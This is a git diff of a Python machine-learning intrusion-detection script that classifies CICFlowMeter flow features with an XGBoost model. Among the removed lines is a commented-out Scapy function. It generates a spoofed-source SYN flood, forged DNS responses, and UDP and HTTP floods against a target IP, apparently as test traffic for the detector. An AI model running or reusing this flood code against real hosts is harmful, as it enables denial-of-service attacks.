@@ -15,6 +15,8 @@ import random
 import string
 from collections import Counter
 from cols import column_rename_map
+import pickle
+import json
 # CONSTANTS
 INTERFACE = "Ethernet 3"  # Change to your network interface
 TARGET_IP = "192.168.18.56"  # Change to your target IP
@@ -163,82 +165,97 @@ def run_cfm(cfm_path, input_file, output_folder):
     except Exception as e:
         print(f"[!] Error running CICFlowMeter: {e}")
         return False
-def predict_anomalies(csv_path, model_path=r"D:\IDS-Project\xgb_ids_model_v3.json"):
+
+def predict_anomalies(csv_path, model_path=r"D:\IDS-Project\xgb_ids_model_v2.json"):
     try:
         print(f"[+] Loading data from: {csv_path}")
         df = pd.read_csv(csv_path)
+        
+        # Debug: Print initial data shape and columns
+        print(f"[DEBUG] Initial data shape: {df.shape}")
+        print(f"[DEBUG] Sample of actual labels: {df['Label'].unique() if 'Label' in df.columns else 'No Label column'}")
         
         # Apply column renaming first
         df = df.rename(columns=column_rename_map)
         df_original = df.copy()
 
-        # Preprocessing steps - only drop columns that exist
-        # Drop non-numeric and unwanted columns
-        non_numeric_cols = ['Flow ID', 'Source IP', 'Destination IP', 'Timestamp', 'Label', 'Source Port', 'Destination Port']
-        df = df.drop(columns=[col for col in non_numeric_cols if col in df.columns], errors='ignore')
+        # Don't drop non-numeric columns - the model expects Protocol
+        # Only drop specific columns that aren't needed
+        non_feature_cols = ['Flow ID', 'Source IP', 'Destination IP', 'Timestamp', 'Label', 'Source Port', 'Destination Port']
+        df = df.drop(columns=[col for col in non_feature_cols if col in df.columns], errors='ignore')
 
-        # Drop columns by index only if the indices exist in df
-        columns_to_drop = [0, 14, 15, 36, 67]
-        existing_indices = [i for i in columns_to_drop if i < df.shape[1]]
-        df = df.drop(df.columns[existing_indices], axis=1)
+        # Don't drop columns by index - the model expects all features
+        # Comment out the column dropping:
+        # columns_to_drop = [0, 14, 15, 36, 67]
+        # existing_indices = [i for i in columns_to_drop if i < df.shape[1]]
+        # df = df.drop(df.columns[existing_indices], axis=1)
 
-       
-        # Clean and normalize features
-        df = df.replace([np.inf, -np.inf], np.nan).fillna(0)
-        if 'Flow Duration' in df.columns:
-            df['Flow Duration'] = df['Flow Duration'].replace(0, 1) / 1e6  # Convert to seconds
-            
-        # Add SYN flood detection features
-        if all(col in df.columns for col in ['SYN Flag Count', 'Total Fwd Packets']):
-            df['syn_ratio'] = df['SYN Flag Count'] / (df['Total Fwd Packets'] + 1e-5)
-            df['short_flow'] = (df['Flow Duration'] < 0.1).astype(int)  # Flows < 100ms
-        
-        # Align features with model expectations
-        with open("training_features.json") as f:
-            expected_features = json.load(f)
-        for feature in expected_features:
-            if feature not in df.columns:
-                df[feature] = 0
-        df = df[expected_features]
-       
-        # Load model and predict
+        # Load XGBoost model to get expected features
         print("[+] Loading XGBoost model...")
         model = xgb.Booster()
         model.load_model(model_path)
-        dmatrix = xgb.DMatrix(df)
-        print(dmatrix.feature_names)
+        expected_model_features = model.feature_names
+        print(f"[DEBUG] Model expects {len(expected_model_features)} features")
+        print(f"[DEBUG] Model expects: {expected_model_features}")
+
+        # Calculate derived features that are expected
+        if 'Flow Duration' in df.columns:
+            # Don't convert Flow Duration to seconds - keep as microseconds
+            # The model was likely trained with microseconds
+            print(f"[DEBUG] Keeping Flow Duration in microseconds")
+            
+            # Calculate Flow Bytes/s, Flow Packets/s, Fwd Packets/s
+            if 'Total Fwd Packets' in df.columns and 'Total Backward Packets' in df.columns:
+                total_packets = df['Total Fwd Packets'] + df['Total Backward Packets']
+                df['Flow Packets/s'] = total_packets / (df['Flow Duration'] / 1e6 + 1e-6)
+                df['Fwd Packets/s'] = df['Total Fwd Packets'] / (df['Flow Duration'] / 1e6 + 1e-6)
+                
+            if 'Fwd Packets Length Total' in df.columns and 'Bwd Packets Length Total' in df.columns:
+                total_bytes = df['Fwd Packets Length Total'] + df['Bwd Packets Length Total']
+                df['Flow Bytes/s'] = total_bytes / (df['Flow Duration'] / 1e6 + 1e-6)
+
+        # Ensure we have all features the model expects
+        print(f"[DEBUG] Current features: {len(df.columns)}")
+        print(f"[DEBUG] Features we have: {list(df.columns)}")
+        
+        # Check which features are missing
+        missing_features = set(expected_model_features) - set(df.columns)
+        if missing_features:
+            print(f"[WARNING] Missing features: {missing_features}")
+            for feature in missing_features:
+                df[feature] = 0.0
+                print(f"[WARNING] Added missing feature '{feature}' with default value 0")
+        
+        # Reorder columns to match model expectations exactly
+        df = df[expected_model_features]
+        
+        print(f"[DEBUG] Final feature count: {len(df.columns)}")
+        print(f"[DEBUG] Final features match model: {list(df.columns) == expected_model_features}")
+
+        # No scaler needed - use features directly
+        print("[+] Using features without scaling...")
+       
+        # Create DMatrix with features in exact order expected by model
+        dmatrix = xgb.DMatrix(df, feature_names=expected_model_features)
+        
         # Get prediction probabilities
         pred_probs = model.predict(dmatrix)
-        print(pred_probs)
-        predicted_classes = []
-        confidence_scores = []
+        print("Prediction probabilities shape:", pred_probs.shape)
+        print("First few predictions:", pred_probs[:5])
         
-        for i, probs in enumerate(pred_probs):
-            max_prob = max(probs)
-            pred_class = np.argmax(probs)
-            confidence_scores.append(max_prob)
-            
-            # Special handling for SYN flood patterns
-            if ('syn_ratio' in df.columns and df.iloc[i]['syn_ratio'] > 0.7 and 
-                df.iloc[i]['short_flow'] == 1 and 
-                max_prob < 0.9):  # Lower threshold for SYN floods
-                predicted_classes.append("DoS_SYN_Flood")
-            else:
-                predicted_classes.append(class_id_to_label.get(pred_class, "UNKNOWN"))
-
+        # No label encoder needed - map directly using class_id_to_label
+        print("[+] Mapping predictions to class names...")
+        
+        # Get predicted class indices
+        predicted_indices = np.argmax(pred_probs, axis=1)
+        
+        # Map indices to class names using class_id_to_label
+        predicted_classes = [class_id_to_label[idx] for idx in predicted_indices]
+        confidence_scores = np.max(pred_probs, axis=1)
+        
         # Add predictions to the original dataframe
         df_original['Prediction'] = predicted_classes
         df_original['Confidence'] = confidence_scores
-        
-        # Now we can apply suspicious criteria
-        suspicious_criteria = (
-            (df_original['SYN Flag Count'] > 100) if 'SYN Flag Count' in df_original.columns else False |
-            (df_original['Flow Duration'] < 0.01) if 'Flow Duration' in df_original.columns else False |
-            (df_original['Total Fwd Packets'] > 500) if 'Total Fwd Packets' in df_original.columns else False
-        )
-        
-        # Only mark as suspicious if not already detected as an attack
-        df_original.loc[suspicious_criteria & (df_original['Prediction'] == 'BENIGN'), 'Prediction'] = 'SUSPICIOUS'
         
         # Debug output - use only available columns
         print("\n[+] Detection Summary:")
@@ -248,10 +265,20 @@ def predict_anomalies(csv_path, model_path=r"D:\IDS-Project\xgb_ids_model_v3.jso
         available_columns = [col for col in ['flow_id', 'src_ip', 'dst_ip', 'prediction', 'confidence'] 
                            if col in df_original.columns]
         
-        suspicious = df_original[df_original['Prediction'].str.contains('DoS|SUSPICIOUS')]
+        suspicious = df_original[df_original['Prediction'].str.contains('DoS|DDoS', na=False)]
         if not suspicious.empty:
             print("\n[!] Suspicious flows detected:")
             print(suspicious[available_columns].to_string())
+        
+        # Check accuracy if actual labels exist
+        if 'Label' in df_original.columns:
+            print(f"\n[DEBUG] Actual labels: {df_original['Label'].value_counts()}")
+            print(f"\n[DEBUG] Accuracy: {(df_original['Label'] == df_original['Prediction']).mean():.2%}")
+            
+            # Per-class analysis
+            print(f"\n[DEBUG] Per-sample analysis:")
+            for i, (actual, predicted, conf) in enumerate(zip(df_original['Label'], df_original['Prediction'], df_original['Confidence'])):
+                print(f"  Sample {i}: Actual={actual}, Predicted={predicted}, Confidence={conf:.3f}")
         
         return df_original
 
@@ -260,71 +287,7 @@ def predict_anomalies(csv_path, model_path=r"D:\IDS-Project\xgb_ids_model_v3.jso
         import traceback
         traceback.print_exc()
         return None
-# def launch_attack(target_ip):
-#     """Generate detectable DoS attacks with DNS fallback handling"""
-#     try:
-#         print("[+] Starting enhanced DoS attack in 3 seconds...")
-#         time.sleep(3)
-        
-#         # Phase 1: SYN Flood (always works with IPs)
-#         print("[+] Phase 1: SYN Flood (500 packets, 60% response rate)")
-#         for i in range(500):
-#             src_ip = f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,254)}"
-#             syn = IP(dst=target_ip, src=src_ip)/TCP(dport=80, flags="S", seq=i)
-#             send(syn, verbose=0)
-            
-#             if random.random() < 0.6:
-#                 time.sleep(0.005)
-#                 syn_ack = IP(dst=src_ip, src=target_ip)/TCP(
-#                     dport=syn[TCP].sport, sport=80,
-#                     flags="SA", seq=random.randint(1000,50000), 
-#                     ack=syn[TCP].seq+1
-#                 )
-#                 send(syn_ack, verbose=0)
 
-#         # Phase 2: DNS Amplification with error handling
-#         print("[+] Phase 2: DNS Amplification")
-#         try:
-#             for i in range(150):
-#                 # Use safe DNS query format
-#                 dns_query = IP(dst=target_ip)/UDP(dport=53)/DNS(
-#                     rd=1, 
-#                     qd=DNSQR(qname="example.com", qtype="A")  # Only "A" records
-#                 )
-#                 send(dns_query, verbose=0)
-                
-#                 if random.random() < 0.7:
-#                     time.sleep(0.01)
-#                     dns_response = IP(dst=target_ip, src="8.8.8.8")/UDP(sport=53)/DNS(
-#                         id=dns_query[DNS].id,
-#                         qr=1,
-#                         qd=dns_query[DNS].qd,
-#                         an=DNSRR(rrname=dns_query[DNS].qd.qname, ttl=10, rdata="1.1.1.1")
-#                     )
-#                     send(dns_response, verbose=0)
-#         except Exception as e:
-#             print(f"[!] DNS attack failed ({str(e)}), falling back to UDP flood")
-#             # Fallback to raw UDP flood
-#             for i in range(200):
-#                 send(IP(dst=target_ip)/UDP(dport=random.randint(10000,60000))/Raw(load="X"*100), verbose=0)
-
-#         # Phase 3: HTTP Flood (IP-based, no DNS needed)
-#         print("[+] Phase 3: HTTP GET Flood")
-#         for i in range(100):
-#             payload = f"GET / HTTP/1.1\r\nHost: {target_ip}\r\n\r\n"
-#             send(IP(dst=target_ip)/TCP(dport=80, flags="PA")/payload, verbose=0)
-            
-#             if random.random() < 0.3:
-#                 time.sleep(0.1)
-#                 http_resp = IP(dst=target_ip, src=target_ip)/TCP(
-#                     sport=80, flags="PA"
-#                 )/("HTTP/1.1 200 OK\r\nContent-Length: 500\r\n\r\n" + "B"*500)
-#                 send(http_resp, verbose=0)
-
-#         print("[+] Attack completed")
-        
-#     except Exception as e:
-#         print(f"[!] Critical attack error: {e}")
 def main():
     ensure_admin()
     os.makedirs(INPUT_PATH, exist_ok=True)
@@ -371,24 +334,6 @@ def main():
         csv_path = os.path.join(OUTPUT_PATH, csv_files[0])
         print(f"[+] Analyzing flows from: {csv_path}")
         
-        # Run CICFlowMeter
-        print("[+] Generating flow features...")
-        if not run_cfm(CFM_PATH, pcap_to_process, OUTPUT_PATH):
-            print("[!] CICFlowMeter processing failed")
-            return
-        
-        # Find the generated CSV
-        base_name = os.path.basename(pcap_to_process).split('.')[0]
-        csv_files = [f for f in os.listdir(OUTPUT_PATH) 
-                   if f.startswith(base_name) and f.endswith(".csv")]
-        
-        if not csv_files:
-            print("[!] No CSV file generated by CICFlowMeter")
-            return
-            
-        csv_path = os.path.join(OUTPUT_PATH, csv_files[0])
-        print(f"[+] Analyzing flows from: {csv_path}")
-        
         result = predict_anomalies(csv_path)
         
         if result is not None:
@@ -402,4 +347,4 @@ def main():
         traceback.print_exc()
 
 if __name__ == "__main__":
-    main() 
+    main()
